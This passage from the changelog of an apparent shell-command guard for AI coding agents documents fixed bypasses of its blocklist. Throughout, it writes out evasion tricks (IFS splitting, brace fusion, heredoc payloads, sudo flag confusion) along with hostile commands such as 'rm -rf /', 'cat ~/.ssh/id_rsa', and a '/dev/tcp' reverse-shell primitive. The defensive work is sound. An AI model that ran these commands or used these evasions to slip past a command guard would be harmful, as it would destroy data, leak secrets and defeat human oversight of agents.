  abbreviations for tar/env (#356), and tar composing more than one `-C`
  occurrence (#354). `make --directory` (the long-form spelling) was
  separately found missing and is fixed here.

- Rule 2's bare-command-position `$VAR` resolution always split the
  resolved value on default whitespace only, never consulting a same-line
  `IFS=` reassignment: `IFS=,; X=rm,-rf,/; $X` resolved to one un-split
  token matching no blocklist rule, unlike the space-joined equivalent
  (`X='rm -rf /'`) that already Blocked through the identical path (#139).
  Now performs real IFS-aware splitting as an additional Block floor
  alongside the existing default-whitespace split (purely additive: an
  IFS-informed match can only escalate Ask to Block, never the reverse).
  Several rounds of review found and closed real regressions in the
  splitting model itself (whitespace-adjacent-to-a-delimiter absorption on
  both leading and trailing sides, empty-value/trailing-field handling,
  `IFS+=` append semantics, and same-line IFS scoping: a same-line
  `IFS=,` prefix on a different command in the line must not leak into
  `$X`'s own expansion). Known gap, tracked as #358: a persisting
  non-default IFS is only tried against per-command rules, not against
  pipeline-shape/decode-stage matching (`IFS=, true; X='base64 -d';
  cat f | $X | python3` still Asks rather than Blocking via the
  decode-pipe rule), and chained `IFS+=` appends don't compose onto the
  inherited-default guess.

- `find`'s `-exec`/`-execdir`/`-ok`/`-okdir` clauses fused into one AST
  word via `$IFS` (`find${IFS}/x${IFS}-exec${IFS}rm${IFS}-rf${IFS}{}${IFS}\;`)
  floored to an `Ask`-only `Unresolvable`, never recursing the payload into
  the blocklist the way the literal-whitespace form does (#122). Now
  recurses when the terminator is provably within the fused word's own
  split. Review found two narrower fail-open variants of this fix before
  it stabilized: a partial fusion (brace-alternation-fused, `find /x
  {-exec,rm} -rf / \;`) let the handler scan only the in-word remainder
  and silently drop the real payload, now floats to the pre-existing
  `Ask` floor whenever the true payload span past the fused word isn't
  certain; and a bare `+` mid-payload (not immediately preceded by `{}`)
  was wrongly accepted as a clause terminator in both the fused and
  non-fused arms, truncating the payload (`find /x {-exec,rm,+,-rf,/} \;`
  wrongly Allowed). POSIX only treats `+` as terminating when it directly
  follows `{}`. Separately, `-ok`/`-okdir` were found to accept `+` as a
  terminator at all, which real `find` never offers them (they prompt
  per-match, incompatible with `{} +` batching): `find /x -ok rm {} + -rf
  / \;` wrongly Allowed; `+` removed from their terminator set (#360).
  **Compatibility note:** this narrows one pre-existing case from Block to
  Ask: `-exec <interpreter> +` with no `{}` anywhere in the clause, which
  was previously (incorrectly) Blocked on the assumption `+` always
  terminates, now correctly Asks via the no-terminator fail-closed path.

- `TargetMatcher::ascent_descent_plausible` (issue #90's Ask floor for a
  `~`/`~username`-anchored ascent past its own anchor) rendered the
  descended-into tail as a candidate but never reasoned about the escaped
  anchor's own basename reappearing mid-tail: `~alice/../bob/.config/
  shguard/x` renders `bob` in front of `.config`, never matching a
  `~/.config/shguard` canon, even though shguard cannot rule out that
  `bob` is the invoking user's own account, in which case a real shell
  collapses the tail right back to `~/.config/shguard/x` (#118). Now also
  tries a second candidate with the reappearing name stripped, whenever
  the rule's own canon is `~`-anchored. Known residual, narrower than the
  original gap: a tail that spells the home container explicitly before
  the reappearing name (`~alice/../home/bob/.config/shguard/x`) strips
  `home`, not `bob`, and survives one level deeper. Not closed here (no
  existing `/home/<user>`-shaped heuristic to build on without introducing
  new platform-specific guessing), tracked as #364.

- `sudo`/`doas` wrapper detection only listed a few separated-value flags
  (`-u`/`-g`/`--user`/`--group` for `sudo`, `-u` for `doas`), so an
  unlisted flag's own argument (`sudo -p prompt`, `doas -a pam`) was
  mistaken for the wrapped command name, letting the real wrapped command
  (`rm -rf /`) skip its blocklist rule and fall through to the escalation
  floor's weaker `Ask` (#402). Both tables were extended to every
  separated-value flag documented in `sudo(8)`/`doas(1)`, including
  BSD-only `-a`/`-c`, plus a safe `Long("auth-type")` entry. A fabricated
  `--login-class` long spelling was deliberately left unadded: it would
  let `unambiguous_long_prefix` mis-resolve the always-valid `sudo
  --login` as an abbreviation of it and wrongly consume the next word as
  a flag value, a new universal downgrade worse than the gap it would
  close.

- Two of the eight `match_command_*` floor probes
  (`match_command_except_target`/`match_command_except_flags`) scanned
  only the embedded blocklist, unlike their six siblings, which all also
  chain a user's own `[[ask]]` rules: a substitution-obfuscated argument
  (`$VAR`, `$(...)`) bypassed a user `[[ask]]` rule that correctly fires
  on the literal spelling (#403). All eight probes now delegate to one
  shared chain-and-find implementation so a future ninth probe can't
  repeat the omission.

- The raw pre-scan's paren-nesting cap reused `MAX_BRACE_NESTING_DEPTH`
  (64), sized for stack-depth bounds rather than PEG-backtracking cost:
  the analogous tightening already applied to braces (issue #52) was
  never applied to parens. A leading run of unbalanced `(` triggers the
  parser's subshell-vs-arithmetic ambiguity into catastrophic
  backtracking: via the CLI/hook path this stalls for the full watchdog
  timeout then fails closed, but via the public library API the detached
  watchdog worker thread keeps burning 100% CPU indefinitely after the
  caller already got its verdict, a real CPU DoS against any long-lived
  process embedding shguard as a library (#404). New
  `MAX_RAW_PAREN_NESTING_DEPTH = 16` caps it, measured flat at depth
  100,000 (~7-10ms) versus the old 64-cap letting depth 26-40 alone burn
  seconds of CPU.

- An overflowing integer contiguous with an io-redirect operator (`<`/`>`)
  or a brace-range endpoint panicked the pinned parser dependency; the
  existing panic guard converted this into a generic parse error for the
  whole command line, so appending a ~25-byte numeric suffix to an
  otherwise-`Block` command silently downgraded the verdict to `Ask`,
  and a downstream embedder building with `panic = "abort"` would get a
  real process abort instead, since that turns the guard into a no-op
  (#405). The io-redirect case is now neutralized ahead of parsing
  (closing the `Block`-to-`Ask` downgrade); the brace-range case is
  pre-checked per word and routed to the same `Unsupported` rejection
  every brace range already gets, which only removes the panic: a
  non-overflowing brace range was already `Ask` before this fix and
  still is. Known residual: the io-redirect pre-emption is not
  quote-aware (a materially wider scan surface than the brace check), but
  no decision-flip results from the gap.

- Rule 2's bare-`$VAR` handling only fed the default-`IFS` split into
  pipeline-shape matching, so a non-default `IFS` split that would only
  be caught by pipeline decode/interpreter-sink matching, not any
  single per-command rule, never reached it: `IFS=,; X='base64,-d'; $X
  | python3` stayed `Ask` even though real bash's comma-split makes this
  the same decode-into-interpreter shape already `Block`ed for `base64
  -d | python3` alone (#384). Every non-default-`IFS` candidate a stage
  tried but couldn't match on its own is now additionally tried as a
  substitute for that stage's pipeline-shape check, raising the verdict
  only on a strict raise: every input this can't raise is byte-for-byte
  unaffected. Known gap: a pipeline needing two or more stages to each
  independently use their own non-default candidate simultaneously
  (`$X | $X`, both `IFS`-split) is still missed, failing safe rather than
  raised.

- Real bash's `&` backgrounds the pipeline (and the whole `&&`/`||` chain
  to its left) into its own subshell, so a `cd`/`pushd`/`popd` inside it
  never persists past the `&`, but shguard's `cwd` model applied the
  mutation to the shared tracking context regardless, letting a
  backgrounded `cd`/`pushd` mask a same-line danger a real shell would
  still catch, e.g. `cd ~/.config/shguard; cd /tmp & cp evil.toml
  config.toml` stayed `Allow` though real bash still runs `cp` from
  `~/.config/shguard` and Blocks (#383). Every pipeline in a chain that
  terminates in a bare `&` (including a brace group whose own body ends
  in `&`) is now evaluated against an isolated clone of `cwd`, and the
  #353 stack-collapse floor now applies to that isolated clone too so a
  resolved-but-really-failed `pushd` mid-chain can't leave a phantom
  stack frame that survives a later `popd`.

- A heredoc body handed to an interpreter on stdin (`python3`, `perl`,
  `node`, `ruby`, `php`, `sh`, etc.) was never scanned against the
  blocklist at all, letting a literal denied payload (`cat
  ~/.ssh/id_rsa`) reach `Allow` just by wrapping it in an interpreted
  script (#424). A shell interpreter's heredoc body now recurses through
  the same analysis a `-c` argument already gets; a non-shell
  interpreter's body floors to `Ask` as unintrospectable, matching the
  existing `-c`/`-e` posture, including through a wrapper (`sudo
  python3 <<EOF`), a compound command (`(python3) <<EOF`, `{ sh; }
  <<EOF`, a `for` loop), `eval`, `env -S`, fish's long-option spellings,
  a substitution embedded anywhere in the receiving command's own words
  (`for x in $(perl); do :; done <<EOF`), an `[[ ]]` extended test's own
  operands, and a sibling redirection whose own substitution inherits the
  same already-dup2'd stdin (`cat > $(perl) <<EOF`). The heredoc body is
  also de-escaped the way bash itself de-escapes an unquoted-delimiter
  body (`\$`, `` \` ``, `\\`, and line-continuation `\<newline>`) before
  recursion, so an escaped substitution can't hide as inert literal text.
  Known parser bug noted but not fixed here (out of scope): `cat <<EOF >
  $(perl)` (redirect written after the heredoc, same line) mis-parses
  the substitution away entirely.

- `exec 3<>/dev/tcp/host/port` (bash's `<>` reverse-shell/data-exfil
  primitive) only reached `Ask`, via the generic "unsupported construct"
  parse-failure fallback, since the AST had no shape for `<>`
  (read-and-write) redirection at all (#425). `<>` now parses into its
  own redirection kind and is treated as a write for gating purposes
  (opening `/dev/tcp/host/port` establishes the connection regardless of
  which direction ends up used), and a new rule blocks `/dev/tcp/`/
  `/dev/udp/` by target path alone, so a plain `>`/`>>` to the same
  pseudo-device is denied too, not just `<>`. Known gap: a plain `<`
  (read-only) to `/dev/tcp` is not covered by this rule and stays
  `Allow`.

- `tar`'s multiple `-C`/`--directory` occurrences on one invocation
  (`tar -C a -C b -xf archive.tar`) skipped cwd composition entirely rather
  than risk attributing the wrong anchor to the wrong operand range (#354).
  Live-verified against bsdtar that `-C` is genuinely cumulative: each
  occurrence chdir(2)s relative to wherever the previous one left off, so
  `resolve_tar_dash_c` now threads the same cumulative `CwdContext` chain
  git/make's own repeated `-C` already uses. The dashless leading-cluster
  spelling (`tar -Cf ... -C ...`) is folded through the same chain rather
  than failing closed on a second `C`, closing an asymmetry where the same
  threat was reachable through a different `tar` spelling.

- sudo/doas/su-wrapped commands that hit an embedded `decision = "ask"`
  blocklist rule (`cp-write-device`, `shell-init-*`, etc.) returned `Ask`
  even with `escalation_floor = "deny"` configured, unlike every sibling
  early return in `evaluate_simple_command_core` (#410). Fixed by wrapping
  this return path in `apply_escalation_floor` the same way the existing
  rule 6a/6c/6e early returns already are.

- A user `[[deny]]` rule appended last by `merge_user_config` could be
  silently shadowed by an earlier embedded `decision = "ask"` rule matching
  the same command, since `match_command` was first-match-wins over
  `command_rules`, violating the documented deny > ask > allow precedence
  invariant with no `--check-config` detection (#411). `match_command` is
  now worst-wins across all matching rules, mirroring `match_redirect_target`
  (#261).

- `gate.rs`'s `bound_git_global_options` hardcoded only `-C`/`-c` as
  separated-value git global flags, unlike `rules.rs`'s already-correct
  flag table. A leading `--git-dir`/`--work-tree` (which also take a
  separated value) shifted the real `-C` anchor further along out of scan,
  letting a user deny rule targeting a cwd-composed path be bypassed
  (#412). `gate.rs` now consults `rules.rs`'s `GIT_GLOBAL_VALUE_FLAGS` table
  via a new `git_global_takes_separated_value` function instead of its own
  divergent hardcoded check.

- A `[[ ... ]]` extended-test expression with a long `!`/`&&`/`||` chain
  reached brush-parser's unbounded recursive descent (or, for `&&`/`||`,
  the recursive `Drop` of the already-parsed tree) uncapped: none of
  `reject_excessive_raw_nesting`'s existing brace/paren/keyword counters see
  any of those bytes. The resulting `SIGABRT` (empty stdout) can't be caught
  by `catch_unwind` and isn't blocking per the hook's exit-code contract, so
  the guarded command proceeded completely unguarded, a fail-open bypass of
  shguard's core guarantee (#413). Closed with a fourth counter in the same
  single-pass raw pre-scan, scoped to text between `[[`/`]]` tokens and reset
  per block; verified end-to-end against both empirically-reported overflow
  shapes (a `!` chain at ~2052 reps, a `&&` chain at ~65838 reps), which now
  return a clean `Ask` verdict with exit 0 instead of aborting.

### Added

- `shguard --check-config`: a one-shot lint pass that warns when a rule keeps
  a string-based `except_targets` entry alongside an added `url_host` entry
  for the same target. Exception alternatives are OR'd, so the retained
  string entry still matches whatever `url_host` was meant to reject, and the
  addition buys zero extra protection (#208). Run by a human or CI, not at
  ordinary hook-invocation time (shguard has no persistent process or
  "config changed" lifecycle, so warning per-hook-call would repeat on every
  matching command for a whole session). Checks the compiled
  `Rules`/`Allowlist`, so it covers allowlist `except_targets` too, not just
  deny/ask rules; loud on stderr and not suppressible by any future
  `--quiet`. Exit codes: 0 clean, 1 findings, 2 couldn't load the config.
  As part of this change, shguard now rejects any CLI argument at all with
  exit 2 and a usage message instead of silently falling through to hook
  mode: the `PreToolUse` hook contract never passes shguard arguments, so
  this can't affect real hook traffic, but it does mean a typo like
  `shguard check-confg` (or a bare `shguard check-config` with dashes
  forgotten) no longer silently blocks on stdin.

- New `shguard check <command>` dry-run subcommand lets rule authors and CI
  assert a command's decision without wiring up a PreToolUse hook, reusing
  the same `analyze_with_policy` path a real hook invocation takes so its
  output can't diverge from one. Exits `1` on `Block` (a real result, not a
  runtime failure) and `2` on usage/config-load errors, matching
  `--check-config`'s existing scheme. Closes #109.

- New optional `decision_log_path` user-config key (off by default): when
  set, every evaluated command is appended as one JSONL line (command,
  decision, reason, matched rule id, deny message, normalized argv) to that
  path, giving operators/tooling a persistent, machine-readable trail beyond
  the ephemeral per-invocation hook response. The log write sits outside the
  evaluation watchdog's bound so a stuck log target (FIFO, hung network
  mount) can never replace an already-computed correct verdict with a
  fail-closed `Ask`; the file is created with `0600` permissions since a
  logged line routinely contains inline secrets. Closes #108.

- `shguard init` scaffolds a starter user config: a comment-only file with a
  header explaining the additive-only model, a few commented-out example
  `[[deny]]`/`[[ask]]` entries, and the full embedded blocklist re-emitted as
  a `#`-prefixed reference appendix (#112). The appendix is read-only by
  design: the embedded blocklist can't be mechanically copied into a live
  `[[deny]]`/`[[ask]]` block, since `merge_user_config` rejects any user rule
  id colliding with an embedded one and merging is additive-only (no
  replace-by-id mechanism exists). Writes atomically (temp file + rename)
  and refuses to overwrite an existing file, symlink, or anything else at
  the target path unless `--force` is passed.

- New `[[token]]` rule type scans assignment names (as `NAME=`) and every
  resolved argv word for a credential-shaped literal substring,
  independent of which command they accompany. Previously no rule
  scanned argv/assignment content this way, only argv-0/flags/targets of
  a specific command, so `AWS_SECRET_ACCESS_KEY=abc123 ls` and `echo
  AWS_SECRET_ACCESS_KEY=abc123` both slipped through entirely (#426). The
  shipped rule (`AWS_SECRET_ACCESS_KEY=`, `_SECRET=`, `_TOKEN=`,
  `PASSWORD=`) ships as `decision = "ask"`, not the rule type's own
  default `block`, since a credential-passing workflow like
  `AWS_SECRET_ACCESS_KEY=x aws s3 ls` is normal, and an existing
  allowlist entry for the accompanying command does **not** suppress
  this floor. The scan also covers a word split across a brace
  alternative or an ANSI-C-quoted escape (`export
  {AWS_SECRET_ACCESS_KEY,DUMMY}=abc123`), and a `for`-clause's `in` list
  or `[[ ]]` operand. Out of scope: assignment values, redirect
  targets, heredoc bodies, user-config-declarable `[[token]]` entries,
  and lowercase/URL-query `password=` shapes.

- New `{ normalized_basename = "..." }` target matcher shape for
  `[[command]]`/`[[redirect]]` rules, comparing only a token's trailing
  path component (the filename) independent of any leading directory.
  Closes a regression against the hook shguard replaces, whose secret-file
  detection allowed a `.env` suffix variant (`.env.local`,
  `.env.production`) under any directory prefix, a shape existing literal
  `prefix = ".env"` targets missed once the file sat under anything other
  than the bare cwd (#427). Matches an exact basename or the basename
  followed by a literal `.`, so it also resolves a named user's home
  subdirectory (`~alice/.env`) the same way an ascent-escaped anchor
  (`~alice/../.env`) already did. No embedded rule ships using this
  matcher yet; adding one is a separate policy decision.

### Fixed

- A syntactically empty command substitution in command position
  (`$() rm -rf /`) always floored to `Ask` indefinitely, regardless of how
  dangerous the trailing tokens were. A real shell's unquoted `$()` with
  nothing inside expands to the empty string and contributes zero fields
  during word-splitting, so `$() rm -rf /` actually dispatches plain
  `rm -rf /` (#124). Now resolves a provably-empty substitution body to an
  empty, vanishing chunk, letting the existing command-position scan skip
  straight to the real command word. This is a precision fix in both
  directions: `$() rm -rf /` now correctly Blocks, and `$() ls` now
  correctly Allows, instead of both indefinitely Asking. Deliberately
  narrow: a body with any actual command content (even a no-op like `:`)
  stays Ask, and a substitution fused into a larger command-position word
  alongside other literal content (`r$()m -rf /`) is a structurally
  different code path this fix doesn't reach; stays Ask, tracked as #361.

- `compose_argv_against_cwd` (issue #103's cwd-folding pass) skipped
  argv[0] as an explicit v1 scope cut, leaving `cd /tmp && ./script.sh`
  uncomposed against the folded cwd. Investigation for #211 found this is
  behaviorally a no-op for every rule that ships today: every command-name
  match (`command`/`command_prefix`, including self-protection rules)
  resolves against `basename(name)`, which is invariant under prepending
  any directory prefix, confirmed by the full existing test suite (1092
  tests) passing unmodified. Implemented anyway to remove the special case
  and keep the composition pass uniform, but this does not change any
  shipped or user-configured rule's decision.

### Compatibility notes

- `[[allow]] command = "ruby"` (and `lua`/`php`/`tclsh`/`python2`) config
  entries now fail to parse. These names joined the pipeline-interpreter
  sink list (see Security, #125), and `matches_dangerous_allow_target`
  rejects an allow entry naming a pipeline-sink interpreter, consistent
  with the existing `python`/`node`/`perl` precedent.

- `find ... -exec <interpreter> +` with no `{}` anywhere in the clause now
  Asks instead of Blocking (see Security, #359/#360). A bare `+` is only
  a valid clause terminator immediately after `{}`; without it, `+` is an
  ordinary payload argument and the clause now falls through the
  fail-closed no-terminator path.

- `shguard`'s published library entry points, `analyze()`/
  `analyze_with_policy()`, now run under their own watchdog and return
  `Ask` on a trip instead of hanging or growing memory unbounded (see
  Security, #319). `Policy` now derives `Clone`. The RSS-growth bound only
  has a real implementation on Linux/macOS; other platforms fall back to
  wall-clock alone.

- The public library API's `analyze_with_policy` and
  `adapter::handle_with_policy` now take an additional `sink: &dyn
  DecisionLogSink` parameter (the decision-log write path moved out of
  the crate's hardwired filesystem adapter and into an injectable port,
  per this project's composition-root architecture rule). `analyze`
  (the single-argument, policy-less entry point) is unaffected. To keep
  prior behavior, pass `&FileDecisionLog` (now re-exported from the crate
  root); a `None` `decision_log_path` in the policy still means no write
  happens even when a sink is passed.

- A heredoc body passed to a non-shell interpreter on stdin (`python3
  <<EOF`, `perl <<EOF`, etc.) now floors to `Ask` instead of `Allow`,
  previously unscanned entirely. Agents that commonly write inline
  Python/Node/Ruby/PHP scripts via a heredoc will see more `Ask`
  prompts after upgrading; see the `heredoc-as-stdin` entry under
  Security above.

- The new `[[token]]` credential-shaped scan (see Added, above) floors to
  `Ask` even when the accompanying command is allowlisted: an allowlist
  entry was never consent to a credential-shaped token appearing
  alongside it. Workflows that routinely pass `AWS_SECRET_ACCESS_KEY=`/
  `_SECRET=`/`_TOKEN=`/`PASSWORD=`-named assignments to an allowlisted
  command will see new `Ask` prompts after upgrading.

## [0.6.1] - 2026-08-24

### Security

- Fixed a bypass of `self-protect-config-sed-tilde`: GNU `sed` permutes
  options after operands, so `sed 's/a/b/' $(echo -i ~/.config/shguard/config.toml)`
  performed an in-place edit of shguard's own config at runtime while
  `matches_except_target`'s existing all-opaque-tail relaxation stayed
  silent (one resolved token — the script — survived in the tail). Closes
  #117.

- The device-destroying command family (`dd`, `shred`, `mkswap`, `mkfs.*`,
  redirect-to-`/dev/`, `tee`-to-`/dev/`) omitted several tools with the
  same destructive effect (#123): `dcfldd` (a drop-in `dd` variant, same
  `if=`/`of=` semantics) now mirrors `dd-write-device` and
  `self-protect-config-dd-tilde`; `wipefs -a`/`-o` (erases a
  filesystem/partition-table signature) and bare `blkdiscard` (always
  discards its target, no confirmation) are now blocked. `cp` writing to a
  `/dev/` target now asks — `cp` has no `if=`/`of=` flags to disambiguate
  source from destination the way `dd`/`dcfldd` do, so this can't
  distinguish `cp /dev/sda backup.img` (reading a device) from `cp file
  /dev/sda` (writing to one) beyond checking both positions; the everyday
  `/dev/{null,zero,urandom,random}` idiom (harmless in either role) is
  carved out via `except_targets` to stay `Allow`. `dcfldd` also mirrors
  `shell-init-dd`'s persistence-path coverage, and the `cp` rule's target
  list covers `-t`/`--target-directory=` (glued, separated, and the
  bare-directory-with-no-trailing-slash form) and `--remove-destination`
  (which replaces a device node outright, not covered by the
  harmless-in-either-role carve-out).

- `rsync --delete` syncing into a dangerous local target is functionally a
  recursive wipe of the destination, the same severity class already
  blocked for `rm -rf` against one, but had no blocklist coverage (#127).
  Like `cp-write-device` above, `rsync` has no flag marking which argv
  position is the destination, so target matching can't tell `rsync
  --delete src/ /` (wiping `/`) from `rsync --delete / backup/` (reading
  `/`, a real full-system-backup idiom) apart from checking both
  positions. Split into two new rules by anchor rather than one flat rule:
  `/`, `/*`, `/dev/*`, and `find`'s own `{}` placeholder now block (rare
  and alarming in either role); `~` and `.` ask (common as a source, e.g.
  "sync my home to backup" — blocking there would over-fire on daily
  usage). Recognized spellings: `--delete`, `--delete-before/-during/
  -delay/-after/-excluded/-missing-args`, and the `--del` alias (also
  added to the pre-existing `self-protect-config-ancestor-rsync-tilde`,
  which was missing it too). Known gap: some rsync implementations (e.g.
  macOS's default openrsync) accept unambiguous long-option prefixes
  (`--delete-a` alone can trigger deletion), which no finite flag list can
  enumerate — same class as the GNU long-option-abbreviation gap already
  noted on `cp-write-device` above.

- `truncate -r`/`--reference=RFILE` sets the target's size to match
  RFILE's size instead of an explicit number — the same unrecoverable
  content-destruction effect as `truncate -s`, but `truncate-zero` only
  checked for `-s`/`--size` (#131). New `truncate-reference` rule blocks
  on `-r`/`--reference` presence alone, regardless of what RFILE actually
  is (shrinking truncates data, growing pads with NUL — both destructive).
  Known gap, same class as the two above: GNU's unambiguous long-option
  prefixes (`--ref`) aren't enumerable and bypass this rule (and
  `truncate-zero`'s own `-s`/`--size` matching has the identical gap,
  pre-existing).

- `rsync`/`mv`/`install` writing a regular file's bytes onto a `/dev/`
  device special file had zero coverage, the same destructive effect as
  the already-blocked `dd`/`tee`/redirect shapes (#136). Unlike
  `cp-write-device` (#123, `ask`): no common daily idiom reads FROM a
  device as the SOURCE for these three, so `mv-write-device`,
  `install-write-device`, and `rsync-write-device` block outright.
  `/dev/shm` (tmpfs scratch space — a real idiom, e.g. `mv build.tar
  /dev/shm/`) is carved out via `except_targets`. `mv`/`install` also
  cover `-t`/`--target-directory=`, mirroring `cp-write-device`'s full
  target list; `install` additionally excepts `/dev/stdin` (a common
  `curl ... | install /dev/stdin dest` idiom, never a disk device node
  even in the write role).

- Fixed a bypass of `except_targets` suppression affecting every rule
  that declares it (not specific to #136's new rules, though that's what
  surfaced it): `except_targets` is deliberately never normalized
  (matched against the raw resolved token — see this file's own
  `except_targets` docs for why), but `targets` itself IS normalized, so
  a `..`-path-ascent respelling of an excepted candidate
  (`/dev/shm/../sda`) could textually start with an excepted prefix
  (`/dev/shm/`) while actually resolving to a target the exception was
  never meant to cover (`/dev/sda`). `CommandRule::matches` now refuses
  to treat any
  `/`- or `~`-rooted candidate containing a literal `..` path segment as
  excepted, regardless of what `except_targets` says — the same
  fail-closed posture already applied to unresolvable words.

- `dd`'s `of=` target only covered `/dev/*`, unlike
  `tee-write-device-or-critical-file`/`redirect-overwrite-device-or-
  critical-file`, which also cover `/etc/passwd`/`/etc/shadow` (#141):
  `dd if=/dev/zero of=/etc/passwd` was exactly as destructive as the
  already-blocked `tee`/redirect equivalent but fell through every rule.
  `dd-write-device`/`dcfldd-write-device` now also target
  `/etc/passwd`/`/etc/shadow`.

- A redirect target beginning with `$HOME`/`${HOME}` (e.g. `cat >
  $HOME/.config/shguard/config.toml`) had no floor at all: shguard
  performs no environment lookups, so `$HOME/...` normalizes to
  `Unresolvable` and was silently dropped before ever reaching the
  redirect-rule check, while the identical target spelled `~/...` was
  already correctly Blocked (#203). Since `$HOME` and `~` expand to the
  same runtime value, a redirect-write target shaped `$HOME<suffix>`
  (bare, `${HOME}`, or double-quoted) now floors to `Ask` whenever
  substituting `~` for `$HOME` would match a redirect rule — capped at
  `Ask` rather than inheriting that rule's own decision, since this is a
  correlation, not a proof. Deliberately narrow by design: an unrelated
  variable (`$TMPDIR/scratch`) or a `$HOME`-prefixed target outside any
  redirect rule's namespace (`$HOME/notes.txt`) stays `Allow`, and only a
  *leading* `$HOME`/`${HOME}` piece is recognised — other variables
  carrying the same practical risk (`$XDG_CONFIG_HOME/...`) remain a
  disclosed residual.

## [0.6.0] - 2026-08-19

### Security

- Fixed a normalization bug where an unquoted, empty brace-alternation
  member (e.g. `{,rm} -rf /`) could win `argv[0]` resolution ahead of the
  real command, resolving to `""` and bypassing every blocklist rule
  entirely (`Allow` instead of `Block`) — found by the nightly differential
  fuzzer (issue #93). `chunks_to_words` now elides an empty resolved
  segment based on whether it was genuinely quoted, not on whether an
  `$IFS` split happened to produce multiple segments; a quoted empty word
  (`''`, `""`, `$''`) still always survives.

- The sudo floor (rule 10, #32) generalises to a unified escalation posture
  covering `doas`, `su`, `pkexec`, and `run0` alongside `sudo` (#35, #36):
  each is now a transparent wrapper, and a command wrapped by any of the
  five floors on a blocklist miss exactly like `sudo` already did (including
  through another wrapper, and on the `bash -c` inner-command path).
- New top-level config key `escalation_floor` (default `"ask"`, `"deny"`
  allowed, `"allow"` rejected at load) raises the floor for all five vectors
  at once via `decision.max(escalation_floor)` — no sudo-specific or
  per-vector config key. This resolves the known limitation noted in 0.2.0:
  the floor itself is still not config-downgradable below its default.
- A user `[[deny]]`/`[[ask]]` rule naming one of the five commands directly
  (e.g. `command = "doas"`) is now reachable — rule matching checks every
  hop of a command's wrapper-unwrap chain, not just the fully-resolved
  effective command, so a rule for the wrapper itself and a rule for the
  wrapped command can coexist and both fire correctly.
- **Compatibility note**: `doas`/`su`/`pkexec`/`run0` joining
  `TRANSPARENT_WRAPPERS` means an existing `[[allow]]` entry that happens to
  match one of them (exactly, or via a `command_prefix` that now collides,
  e.g. `"do"` or `"run"`) is rejected at config load, where it previously
  loaded fine — this fails shguard closed for every command until the entry
  is removed or narrowed, the same load-time rejection `sudo`-matching
  `[[allow]]` entries already had.

## [0.5.0] - 2026-08-17

### Added

- Shell-init and persistence paths (`~/.bashrc`, `~/.zshrc`,
  `~/.config/fish/config.fish`, `/etc/cron.*`, LaunchAgents, systemd user
  units, `~/.ssh/authorized_keys`, `/etc/ld.so.preload`, and 30+ more) are
  protected across every write mechanism — `tee`, `cp`, `mv`, `install`,
  `sed -i`, `dd of=`, `ln`, `rm`, `unlink`, and now bare shell redirection
  (`>`/`>>`) — all at `ask` (#259, #198, #261).
- `find`'s own `{}` placeholder is recognized wherever `find` substitutes
  it, not only as a standalone token: `rm -f ./{}`, `{}/`, `x/../{}`, `/{}`
  and `~/{}` now block alongside the bare spelling (#140, #267).
- `find … | xargs rm -f` blocks, matching `find -exec rm -f {}` and
  `find -delete` — the piped form has the same delete-every-match effect
  (#268).
- New optional `sink_required_flags` on `[[pipeline]]` rules, constraining
  the resolved sink's own flags (#268).
- `eval` and `awk`'s bare-positional script route through interpreter-code
  recursion the way `sh -c` does (#255, #258).
- The parser handles `if`, background jobs (`&`), `[[ ]]`, and pipeline
  negation (#256).
- A redirect target's statically-known substitution output is checked
  against the redirect rules (`> $(echo /dev/sda)`), not only the literal
  target (#130).

### Fixed

- Wrapper flag handling no longer mistakes a flag's value for the wrapped
  command: `env`'s own value flags (#250), `stdbuf`/`xargs` (#264),
  getopt-style short-flag clusters (`env -iu FOO rm -rf /`, #265), GNU
  unambiguous long-option abbreviations (`env --uns`, `xargs --max-a`,
  `stdbuf --out`, #266), and `env -S`'s argv splicing, which is now
  reconstructed and recursed (#265).
- `fish` is modelled on its own option surface rather than POSIX `sh`'s:
  `-C`/`--init-command`, attached values (`--command=CODE`, `-cCODE`),
  repeated `-c`, and unique-prefix long options are each read as what they
  are (#269).
- `find -exec` spawning a bare shell interpreter with no `-c` no longer
  slips through (#196 follow-up, #257).
- BSD/macOS `sed -I` counts as an in-place flag everywhere `-i` does,
  including shguard's own config self-protection (#263).
- `rm -R` (uppercase) counts as recursive (#206), and an ANSI-C-decoded
  embedded NUL is treated as unresolvable rather than silently merging
  tokens (#138).
- Redirect-target decisions fold worst-wins across rules, targets, and both
  target-resolution channels, instead of taking the first match and
  short-circuiting the remaining checks (#261).

### Compatibility notes

- **`echo ... >> ~/.zshrc` now asks.** Appending to a shell-init or
  persistence path is the standard installer idiom, so it asks rather than
  blocks — but it is no longer silently allowed. `>` truncation of the same
  paths asks too, matching every other write mechanism for those targets.
- A config using `[[pipeline]]`'s new `sink_required_flags` field fails to
  load on an older shguard (unknown fields are rejected), which fails
  closed for every command until the field is removed.
- Two decisions deliberately relaxed where the previous behavior did not
  match the real tool: `fish script.fish -c '...'` allows (fish stops
  option parsing at the script operand, so `-c` is data), and
  `find -exec fish {} -c '...'` asks rather than blocks, the same demotion
  `find -exec sh {} -c` already had.

## [0.4.1] - 2026-08-15

- **Compatibility note**: a `command` value containing whitespace (issue
  #96) used to be inert — `CommandMatch::Exact` compared it against one
  whole resolved argv token, which a `command` value containing any
  whitespace (leading, trailing, or between multiple words) could never
  equal, so it silently matched nothing — and now desugars into a command name
  plus `required_tokens`, making it live. A config that harmlessly did
  nothing before an shguard upgrade can start actively matching (and, in
  an `[[allow]]` entry, downgrading `Ask` to `Allow`) after upgrading —
  audit existing configs for accidental whitespace in `command` values,
  especially in `[[allow]]` entries. As a consequence, exact-matching a
  literal command name that itself contains a space (e.g. from a quoted
  `argv[0]` like `'my prog' --arg`) is no longer possible — whitespace in
  `command` is now unconditionally the subcommand-sugar split, with no
  escape hatch; accepted as a deliberate trade-off, since no known
  real-world command has a literal space in argv[0] and no rule in this
  repo relied on the old behavior. This also means several previously-
  loading configs now fail to load instead (a multi-word `command` with a
  flag-looking extra word, e.g. `command = "rm -rf"`; whitespace in
  `command_prefix`; an `[[allow]]` entry whose sugar-derived command name
  matches a shell interpreter) — and per this project's fail-closed
  design, any user-config load error makes the hook Ask on every single
  command until the config is fixed, not silently ignore the bad entry.
- **Compatibility note**: the `required_tokens` + `except_targets`
  dead-config rejection (issue #96) is not limited to configs that use the
  new `command` sugar or that contain whitespace — it applies to any
  command rule with that shape, sugar or not. A pre-existing, hand-written,
  sugar-free rule that loaded fine before this PR — e.g. `command = "gh"`
  with `required_tokens = ["repo", "delete"]` and `except_targets = [{
  prefix = "sandbox/" }]` (`targets`/`value_flags` both empty) — now fails
